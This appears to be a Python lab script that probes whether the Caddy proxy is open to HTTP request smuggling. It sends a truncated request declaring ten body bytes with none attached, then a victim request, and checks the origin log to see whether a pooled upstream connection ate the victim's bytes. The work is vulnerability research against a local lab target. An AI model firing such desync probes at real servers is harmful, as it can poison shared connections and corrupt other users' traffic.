"""Is Caddy's CL>body forwarding a real smuggling desync or a benign truncation?
The crux is upstream connection REUSE. Fire a truncated request (CL=10, 0 body,
standalone-FIN), then a victim well-formed request. If Caddy pools the poisoned
upstream connection, the victim's first 10 bytes are eaten as the missing body and
its request-line never logs cleanly (CVE-2026-33555 impact). If Caddy closes the
upstream after the truncated body, the victim arrives on a fresh conn and logs
clean -> no smuggling. Reads the exact forwarded bytes and the origin CONN/REQ log."""
import os, sys, time
sys.path.insert(0, "/home/j4kuuu/Desktop/tools/Phage/src")
from phage.evo import genome as G
import h3_oracle as O

PORT = 4439
CONN_LOG = "/tmp/phage_panel/conn.log"
TAP = O.TAP


def H(cl, path):
    return G.Headers(((b":method", b"POST"), (b":scheme", b"https"),
                      (b":authority", b"lab"), (b":path", path),
                      (b"content-length", str(cl).encode())), end_stream=False)


def read(p):
    try:
        with open(p, "rb") as f:
            return f.read()
    except OSError:
        return b""


# baseline: two well-formed requests -> how many origin CONNs? (does Caddy pool at all?)
open(CONN_LOG, "w").close()
off = os.path.getsize(TAP)
O.probe(PORT, [H(4, b"/one"), G.Data(b"AAAA", end_stream=True)])
O.probe(PORT, [H(4, b"/two"), G.Data(b"BBBB", end_stream=True)])
time.sleep(0.5)
base_log = read(CONN_LOG)
print("=== baseline: two well-formed requests ===")
print(base_log.decode("latin1").strip())
conns = base_log.count(b"CONN")
print(f"origin CONNs for 2 clean requests: {conns}  (1 = Caddy pools upstream, 2 = no pool)")

# poisoning: truncated (CL=10,0 body,FIN) then victim
open(CONN_LOG, "w").close()
O.probe(PORT, [H(10, b"/evil"), G.Fin()])          # truncated: CL=10 declared, 0 body
O.probe(PORT, [H(5, b"/victim"), G.Data(b"VVVVV", end_stream=True)])
time.sleep(0.5)
poison_log = read(CONN_LOG)
print("\n=== poisoning: truncated CL=10/0body, then victim ===")
print(poison_log.decode("latin1").strip())
victim_clean = b"REQ POST /victim" in poison_log
print(f"\nvictim request-line logged CLEANLY at origin: {victim_clean}")
print("VERDICT:", "NO smuggling (victim intact / no reuse)" if victim_clean
      else "*** possible pool poisoning: victim request-line eaten ***")
